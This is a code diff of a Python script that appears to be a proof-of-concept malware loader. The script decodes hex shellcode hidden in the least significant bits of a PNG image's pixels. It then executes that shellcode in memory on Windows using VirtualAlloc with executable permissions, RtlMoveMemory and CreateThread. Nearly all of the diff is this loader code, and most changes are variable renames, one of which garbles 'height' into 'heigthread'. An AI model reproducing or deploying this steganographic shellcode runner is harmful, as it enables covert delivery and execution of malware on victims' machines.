@@ -2,7 +2,6 @@
 from PIL import Image
 import ctypes
 import binascii
-import sys
 
 
 def binary_to_text(binary_data):
@@ -15,11 +14,11 @@ def decode_lsb(encoded_image_path):
     # Convert the image to RGB mode (if it's not already)
     encoded_image = encoded_image.convert("RGB")
 
-    width, height = encoded_image.size
+    width, heigthread = encoded_image.size
     binary_data = ""
 
     # Extract binary data from the least significant bits of the pixels
-    for y in range(height):
+    for y in range(heigthread):
         for x in range(width):
             pixel = encoded_image.getpixel((x, y))
             for channel in range(3):  # 3 channels (RGB)
@@ -35,37 +34,37 @@ def decode_lsb(encoded_image_path):
         bad_char = plaintext_data[-1:]
         plaintext_data = plaintext_data.replace(bad_char, '"')
     hex_array = plaintext_data.split('"')
-    buf = b''
+    buffer = b''
     for i in hex_array:
         if i != '':
-            buf += '{}'.format(i).encode()
-
-    return buf
+            buffer += '{}'.format(i).encode()
+    return buffer
 
 
 def shellcode_exec(shellcode_raw):
 
     shellcode = bytearray(shellcode_raw)
 
-    ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
+    pointer = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                           ctypes.c_int(len(shellcode)),
                                           ctypes.c_int(0x3000),
                                           ctypes.c_int(0x40))
  
-    buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
+    buffer = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
  
-    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
-                                     buf,
+    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(pointer),
+                                     buffer,
                                      ctypes.c_int(len(shellcode)))
  
-    ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
+    thread = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                          ctypes.c_int(0),
-                                         ctypes.c_int(ptr),
+                                         ctypes.c_int(pointer),
                                          ctypes.c_int(0),
                                          ctypes.c_int(0),
                                          ctypes.pointer(ctypes.c_int(0)))
  
-    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
+    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(thread),
+                                        ctypes.c_int(-1))
 
 encoded_image_path = "poc_example.png"
 shellcode_str = decode_lsb(encoded_image_path)
